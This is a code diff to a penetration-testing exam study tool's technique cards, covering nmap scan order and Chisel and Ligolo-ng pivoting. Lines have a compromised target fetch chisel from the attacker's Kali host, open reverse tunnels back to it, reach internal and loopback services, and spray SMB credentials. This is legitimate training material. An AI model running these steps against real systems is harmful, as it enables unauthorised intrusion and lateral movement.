@@ -39,19 +39,25 @@ const CORE: Technique[] = [
     id: "exam-order",
     section: "Exam",
     title: "Order of work",
-    look: "Do not start a host with kernel or random exploits. The loop is always the same: ports, version, service, foothold, local enum, privilege, loot, spray, pivot.",
-    cmd: `# Per host folder first
+    look: "Every host starts the same way. Make a folder, then scan TCP and UDP before you look at an exploit. SNMP, TFTP, NTP, and IKE never appear on a TCP scan, so a host with no UDP pass is only half mapped. After both scans, work one open service, then the shell, then that operating system from the top.",
+    cmd: `# Per host folder first. <ip> is the real address. Do not type the brackets.
 mkdir -p ~/exam/<ip>/{scans,loot,shells}
 
-# Then, in this order:
-# 1. nmap quick + full TCP
-# 2. only the open services (see Services)
-# 3. shell
-# 4. Linux or Windows privesc page, top to bottom
-# 5. new creds sprayed before you "move on"`,
-    alive: "You can name the next single check. If you cannot, you are browsing, not attacking.",
-    dead: "Reading a 2000-line PEAS dump before sudo -l / whoami /priv. That is the usual time sink.",
-    next: "Open the matching section for the OS or the open port. Tick this card when the folder exists.",
+# 1. Common TCP ports, with the default scripts and versions. Read this while step 2 runs.
+nmap -Pn -sC -sV -oA scans/quick <ip>
+# 2. Every TCP port. A service on a high port is normal here.
+nmap -Pn -p- --min-rate 2000 -oA scans/alltcp <ip>
+# 3. UDP. This is required on every host, not a scan you add when TCP looks empty.
+# Top 20 is the exam pass. All 65535 UDP ports will take the morning.
+sudo nmap -Pn -sU --top-ports 20 -T4 -oA scans/udp <ip>
+# 4. Versions only on TCP ports that step 2 added.
+nmap -Pn -sC -sV -p <new-ports> -oA scans/deep <ip>
+# 5. One service card for each port that is actually open, TCP or UDP.
+# 6. Shell, then the Linux or Windows page from the top.
+# 7. Any new password gets tried on the other hosts before you leave.`,
+    alive: "You can name the next single check, and both the TCP list and the UDP top 20 exist under scans/.",
+    dead: "You started from a kernel exploit, or you finished TCP and skipped UDP. Re-running the same scan is not the missing pass.",
+    next: "Open Services for one open port. nmap top 20 is the UDP port pass. The UDP protocol scanner on the Recon page is Cisco's tool: it sends a real DNS, NTP, TFTP, or SNMP packet and shows the reply in the terminal.",
   },
   {
     id: "exam-stuck",
@@ -91,10 +97,10 @@ whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\proof.txt
     id: "recon-nmap",
     section: "Recon",
     title: "Nmap",
-    look: "Open ports, service name, version string, and whether the path is quoted later on Windows. Ignore closed ports.",
+    look: "Four passes, then you stop scanning. The first names the common TCP services. The second finds TCP ports outside that list. The third is UDP, which a TCP scan cannot see. The fourth asks for versions only on the new TCP ports. Ignore closed ports.",
     cmd: `nmap -Pn -sC -sV -oA scans/quick <ip>
 nmap -Pn -p- --min-rate 2000 -oA scans/alltcp <ip>
-nmap -Pn -sU --top-ports 50 -oA scans/udp <ip>
+sudo nmap -Pn -sU --top-ports 20 -T4 -oA scans/udp <ip>
 nmap -Pn -sC -sV -p <open> -oA scans/deep <ip>`,
     alive: `PORT     STATE SERVICE VERSION
 8000/tcp open  http    Apache httpd 2.4.54 ((Win64) PHP/7.4.30)
@@ -1425,7 +1431,7 @@ proxychains -q nmap -Pn -sT -p 22,80,445 <internal>
     id: "pv-chisel",
     section: "Tunneling",
     title: "Chisel",
-    look: "A shell, no SSH, and the target can reach your Kali IP. Chisel reverse puts the listener on Kali. SOCKS for a few hosts. One R: line for a single port. A /24 is Ligolo, not this.",
+    look: "A shell, no SSH, and the target can reach your Kali IP. SOCKS for a few hosts. One R: line for a single port the pivot can see. A service bound to the victim's 127.0.0.1 is R:local:127.0.0.1:port, not SOCKS. A /24 is Ligolo.",
     cmd: `# Kali first
 chisel server -p 8000 --reverse
 file chisel
@@ -1434,6 +1440,8 @@ curl -o /tmp/chisel http://<KALI>/chisel && chmod +x /tmp/chisel
 /tmp/chisel client <KALI>:8000 R:socks
 # one port: Kali 8081 -> the target's view of an internal web port
 /tmp/chisel client <KALI>:8000 R:8081:<internal>:80
+# victim loopback. 127.0.0.1 here is the victim. On Kali you then use 127.0.0.1:8081
+/tmp/chisel client <KALI>:8000 R:8081:127.0.0.1:3306
 # Kali. /etc/proxychains4.conf ends with: socks5 127.0.0.1 1080
 proxychains -q nmap -Pn -sT -p 22,80,445,3389,5985 <internal>
 curl -sI http://127.0.0.1:8081/
@@ -1448,7 +1456,7 @@ curl -sI http://127.0.0.1:8081/
     id: "pv-ligolo",
     section: "Tunneling",
     title: "Ligolo-ng",
-    look: "A subnet, not one port. Ligolo is a TUN interface, so nmap, nxc, and curl run with no proxychains. The proxy listens before the agent. The route is added after start. Callbacks from a host that cannot see Kali are the callback card.",
+    look: "A subnet, not one port. Ligolo is a TUN interface, so nmap, nxc, and curl run with no proxychains. The proxy listens before the agent. The route is added after start. The victim's 127.0.0.1 is 240.0.0.1 on that interface, not a route to 127. Callbacks from a host that cannot see Kali are the callback card.",
     cmd: `# Kali, once per boot. 'file exists' means skip the add.
 sudo ip tuntap add user $USER mode tun ligolo
 sudo ip link set ligolo up
@@ -1465,7 +1473,10 @@ sudo ip route add 172.16.0.0/24 dev ligolo
 nmap -Pn -sC -sV -p 22,80,445,3389,5985 172.16.0.10
 nxc smb 172.16.0.0/24 -u <user> -p '<pass>'
 # tear down when the subnet is finished
-sudo ip route del 172.16.0.0/24`,
+sudo ip route del 172.16.0.0/24
+# victim loopback, after start. 240.0.0.1 means their 127.0.0.1. Never route 127.0.0.0/8.
+sudo ip route add 240.0.0.1/32 dev ligolo
+nmap -Pn -sT -p <port> 240.0.0.1`,
     alive: "Agent joined, start says tun created, and ping or nmap to 172.16.x.x works.",
     dead: "Agent never joins: wrong IP, firewall, or you started the route before start. 'file exists' on tuntap means the interface is already there. Do not add it twice.",
     next: "Treat the new subnet as a new recon. Full methodology again, starting at Nmap.",
